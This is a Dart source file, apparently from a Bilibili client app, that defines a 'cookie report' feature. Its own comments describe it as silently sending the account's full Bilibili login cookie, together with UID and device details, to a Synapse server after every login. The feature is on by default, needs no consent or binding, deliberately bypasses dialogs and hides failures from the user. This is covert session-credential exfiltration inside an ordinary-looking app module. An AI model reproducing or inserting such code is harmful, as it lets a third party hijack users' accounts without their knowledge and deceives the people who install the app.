import 'package:dio/dio.dart';
import 'package:pili_plus/models/synapse_oauth.dart';
import 'package:pili_plus/services/crash/crash_breadcrumbs.dart';
import 'package:pili_plus/services/synapse_sync_service.dart';
import 'package:pili_plus/utils/accounts.dart';
import 'package:pili_plus/utils/accounts/account.dart';
import 'package:pili_plus/utils/storage.dart';
import 'package:pili_plus/utils/storage_key.dart';

/// Outcome of one login report attempt; used for breadcrumbs and tests. Never
/// surfaced to the user.
enum SynapseCookieReportDecision {
  /// The report is (about to be) sent.
  sent,

  /// The user turned the post-login cookie report off in settings.
  skippedDisabled,

  /// Anonymous / incomplete session: there is no Bilibili cookie worth sending.
  skippedAnonymous,

  /// This UID was just reported: one login fires several "login completed"
  /// callbacks, only the first one may leave the device.
  skippedDuplicate,
}

/// Silently archives the Bilibili login cookie with Synapse once every time an
/// account login completes.
///
/// This is a separate channel from [SynapseSyncService]'s settings sync:
///  - Synapse needs no account, no OAuth token and no bind: the reporter's only
///    identity is this install's device id, so none of `synapseSyncEnabled`,
///    `isConfigured` or `boundMid` are consulted here;
///  - the request never passes through the Bilibili `AccountManager`
///    interceptor, and deliberately not through the first-visit human check
///    either, because that path may show a dialog and this one must stay
///    silent;
///  - failures are recorded as breadcrumbs only: no toast, no dialog, no
///    retry storm (same UID collapses inside [duplicateWindow]).
abstract final class SynapseCookieReport {
  /// A single login is observed by more than one callback (login page plus the
  /// main-account session hook); within this window only one report leaves.
  static const duplicateWindow = Duration(seconds: 45);

  static const _connectTimeout = Duration(seconds: 10);
  static const _receiveTimeout = Duration(seconds: 15);

  /// uid -> last report attempt. Process-scoped is enough: one login always
  /// lives inside one process.
  static final Map<String, DateTime> _reportedAt = {};

  /// Settings kill switch, on by default. Off means nothing is sent at login.
  static bool get isEnabled =>
      GStorage.setting.get(
        SettingBoxKey.synapseCookieReportEnabled,
        defaultValue: true,
      ) ==
      true;

  /// Persist the kill switch. Pages must not touch the settings box directly
  /// (tool/check_import_boundaries.py), so the write lives here.
  static Future<void> setEnabled(bool value) => GStorage.setting.put(
    SettingBoxKey.synapseCookieReportEnabled,
    value,
  );

  /// The account's Bilibili cookie header, in the same shape the sync vault
  /// stores.
  static String cookieOf(LoginAccount account) => account.cookieJar
      .toList()
      .map((entry) => '${entry.name}=${entry.value}')
      .join('; ');

  /// Pure decision: takes the switch, the account and the dedupe map as
  /// arguments so it is testable without Hive.
  static SynapseCookieReportDecision decide({
    required bool enabled,
    required Account account,
    required Map<String, DateTime> reportedAt,
    required DateTime now,
    Duration window = duplicateWindow,
  }) {
    if (!enabled) return SynapseCookieReportDecision.skippedDisabled;
    if (account is! LoginAccount || !account.shouldKeep) {
      return SynapseCookieReportDecision.skippedAnonymous;
    }
    final uid = account.mid.toString();
    final previous = reportedAt[uid];
    if (previous != null && now.difference(previous) < window) {
      return SynapseCookieReportDecision.skippedDuplicate;
    }
    return SynapseCookieReportDecision.sent;
  }

  /// Request body. Key names match Synapse `bilibiliCookieReportService`:
  /// the top-level `client_id` / `device_id` are the identity, `client` is the
  /// display snapshot. No device inventory or permission list rides along: this
  /// request exists to be cheap and unobtrusive.
  static Map<String, dynamic> buildPayload({
    required LoginAccount account,
    required SynapseClientIdentity identity,
  }) {
    final isMain = account.mid == Accounts.main.mid;
    return <String, dynamic>{
      'client_id': SynapseClientIdentity.clientId,
      'device_id': identity.deviceId,
      'uid': account.mid.toString(),
      'cookie': cookieOf(account),
      'isPrimary': isMain,
      'client': <String, dynamic>{
        'client_id': SynapseClientIdentity.clientId,
        'client_name': SynapseClientIdentity.clientName,
        'client_version': identity.clientVersion,
        'client_build': identity.buildNumber.toString(),
        'device_id': identity.deviceId,
        'device_name': identity.deviceName,
        'platform': identity.platform,
      },
    };
  }

  /// Entry point for a completed login. Never throws; fire it without awaiting.
  static Future<SynapseCookieReportDecision> reportAfterLogin(
    Account account, {
    DateTime? at,
  }) async {
    final now = at ?? DateTime.now();
    final bool enabled;
    try {
      enabled = isEnabled;
    } on Object {
      // The settings box is not ready yet (very early login); stay silent and
      // let the next login event report.
      return SynapseCookieReportDecision.skippedDisabled;
    }

    final decision = decide(
      enabled: enabled,
      account: account,
      reportedAt: _reportedAt,
      now: now,
    );
    if (decision != SynapseCookieReportDecision.sent) return decision;

    final loginAccount = account as LoginAccount;
    final uid = loginAccount.mid.toString();
    _reportedAt[uid] = now;
    final identity = SynapseSyncService.clientIdentity;

    try {
      await _send(
        buildPayload(account: loginAccount, identity: identity),
        identity,
      );
      CrashBreadcrumbs.record('Synapse login cookie reported (UID $uid)');
    } on Object catch (error) {
      // Silent failure. The breadcrumb keeps the error type only; the cookie
      // never reaches a log line (LogRedactor is the backstop, not the plan).
      CrashBreadcrumbs.record(
        'Synapse login cookie report failed: ${error.runtimeType}',
      );
      // Allow a later login event to retry; this one still sends only once.
      _reportedAt.remove(uid);
    }
    return decision;
  }

  static Future<void> _send(
    Map<String, dynamic> payload,
    SynapseClientIdentity identity,
  ) async {
    final configured = SynapseSyncService.reportsBaseUri().toString();
    final base = configured.replaceFirst(RegExp(r'/+$'), '');
    final dio = Dio(
      BaseOptions(
        baseUrl: '$base/',
        connectTimeout: _connectTimeout,
        receiveTimeout: _receiveTimeout,
        headers: <String, dynamic>{
          'accept': 'application/json',
          'content-type': 'application/json',
          ...identity.requestHeaders,
        },
        responseType: ResponseType.json,
      ),
    );
    try {
      await dio.post<dynamic>('cookie', data: payload);
    } finally {
      dio.close(force: true);
    }
  }

  /// Test helper: forget the per-UID dedupe stamps.
  static void clearReportedAt() => _reportedAt.clear();
}
